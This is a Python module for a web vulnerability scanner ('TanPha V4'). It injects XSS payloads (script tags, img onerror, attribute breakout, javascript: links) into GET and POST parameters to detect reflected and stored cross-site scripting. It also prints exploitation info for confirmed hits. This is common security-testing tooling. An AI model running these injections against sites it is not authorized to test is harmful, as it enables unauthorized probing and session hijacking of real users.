"""XSS Module for TanPha V4 (Reflected & Stored - Global)."""
import time
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
from modules.base import BaseModule
from core.context import TargetContext, Evidence, Finding
from core.verification import VerificationResult, VerificationStatus


class XSSModule(BaseModule):
    name = "CrossSiteScripting"
    module_id = "xss"
    version = "1.1 (Stored Support)"
    vulnerability_class = "XSS"
    default_impact = "SESSION_HIJACKING"
    default_privilege = "USER"

    def can_run(self, context: TargetContext) -> bool:
        return True

    def _get_submit_field(self, context):
        for p in context.discovery.parameters:
            if any(k in p.lower() for k in ["submit", "login", "go", "send", "btn", "save", "search"]):
                return p
        return "Submit"

    def _send_payload(self, context, param, payload, method="GET", scope_checker=None, timeout=10):
        if method == "GET":
            parsed = urlparse(context.target.base_url)
            qs = parse_qsl(parsed.query, keep_blank_values=True)
            new_qs = [(k, v + payload) if k == param else (k, v) for k, v in qs]
            if not new_qs:
                new_qs = [(param, payload)]
            target_url = urlunparse(parsed._replace(query=urlencode(new_qs, safe="<>\"'()/=")))
            return context.http_client.request("GET", target_url, target_param=param, scope_checker=scope_checker, bypass_mutation=True, timeout=timeout)
        else:
            submit_field = self._get_submit_field(context)
            data = {param: payload, submit_field: "Submit"}
            return context.http_client.request("POST", context.target.base_url, data=data, scope_checker=scope_checker, bypass_mutation=True, timeout=timeout)

    def assess(self, context: TargetContext, scope_checker=None) -> list[Evidence]:
        params_to_test = context.discovery.parameters if context.discovery.parameters else []
        if not params_to_test:
            return []

        print(f"      [>] Testing XSS (Reflected & Stored) on {len(params_to_test)} parameters...")
        
        marker = "TANPHA_XSS_7331"
        payloads = [
            {"payload": f"<script>alert('{marker}')</script>", "desc": "Basic Script Tag"},
            {"payload": f"<img src=x onerror=alert('{marker}')>", "desc": "Img Onerror"},
            {"payload": f"\"><script>alert('{marker}')</script>", "desc": "Attribute Breakout"},
            {"payload": f"javascript:alert('{marker}')", "desc": "HREF Injection"}
        ]

        for param in params_to_test:
            for item in payloads:
                # 1. TEST REFLECTED (GET)
                res_get = self._send_payload(context, param, item["payload"], method="GET", scope_checker=scope_checker)
                if res_get.success and res_get.response and item["payload"] in res_get.response.text:
                    print(f"      [!] Reflected XSS found on '{param}' using {item['desc']}")
                    return [Evidence(
                        attempt_id="xss_reflect", module_id=self.module_id, module_version=self.version,
                        location=context.target.base_url, parameter=param, outcome="CHANGED_RESPONSE",
                        reason_code="REFLECTED_XSS", reason_detail=f"Payload '{item['desc']}' reflected raw",
                        confidence=0.9, evidence_text=f"Payload: {item['payload']}", assess_payload=item["payload"]
                    )]

                # 2. TEST STORED (POST -> GET)
                res_post = self._send_payload(context, param, item["payload"], method="POST", scope_checker=scope_checker)
                if res_post.success and res_post.response:
                    if item["payload"] in res_post.response.text:
                        # Kalau langsung muncul di response POST, anggap stored
                        print(f"      [!] Potential Stored XSS (Immediate) found on '{param}' using {item['desc']}")
                        return [Evidence(
                            attempt_id="xss_stored_imm", module_id=self.module_id, module_version=self.version,
                            location=context.target.base_url, parameter=param, outcome="CHANGED_RESPONSE",
                            reason_code="STORED_XSS", reason_detail=f"Payload '{item['desc']}' stored & reflected immediately",
                            confidence=0.85, evidence_text=f"Payload: {item['payload']}", assess_payload=item["payload"]
                        )]
                    
                    # Cek secara "Blind Stored" (kadang payload masuk DB, muncul di halaman lain)
                    time.sleep(1) # Kasih nafas DB bentar
                    res_check = context.http_client.request("GET", context.target.base_url, scope_checker=scope_checker, bypass_mutation=True)
                    if res_check.success and res_check.response and item["payload"] in res_check.response.text:
                        print(f"      [!] Potential Stored XSS (Delayed) found on '{param}' using {item['desc']}")
                        return [Evidence(
                            attempt_id="xss_stored_delayed", module_id=self.module_id, module_version=self.version,
                            location=context.target.base_url, parameter=param, outcome="CHANGED_RESPONSE",
                            reason_code="STORED_XSS", reason_detail=f"Payload '{item['desc']}' found on subsequent GET",
                            confidence=0.85, evidence_text=f"Payload: {item['payload']}", assess_payload=item["payload"]
                        )]
        return []

    def verify(self, context: TargetContext, evidence: Evidence, scope_checker=None) -> VerificationResult:
        print(f"      [*] Verifying XSS on '{evidence.parameter}'...")
        
        method = "GET" if evidence.reason_code == "REFLECTED_XSS" else "POST"
        res = self._send_payload(context, evidence.parameter, evidence.assess_payload, method=method, scope_checker=scope_checker)
        
        if res.success and res.response and evidence.assess_payload in res.response.text:
            return VerificationResult(
                VerificationStatus.VALIDATED, 0.95, "XSS_CONFIRMED", 
                f"{method} request confirmed payload reflection.", 
                verify_payload=evidence.assess_payload
            )
        return VerificationResult(VerificationStatus.REJECTED, 0.0, "XSS_FAILED", "Payload not reflected.")

    def exploit(self, context: TargetContext, finding: Finding):
        print("\n[***] XSS EXPLOITATION INFO [***]")
        print(f"[*] Target URL : {finding.location}")
        print(f"[*] Vulnerable Parameter : {finding.parameter}")
        print(f"[*] Payload : {finding.verify_payload}")
        print("\n[!] Copy the payload above into your browser to execute.")
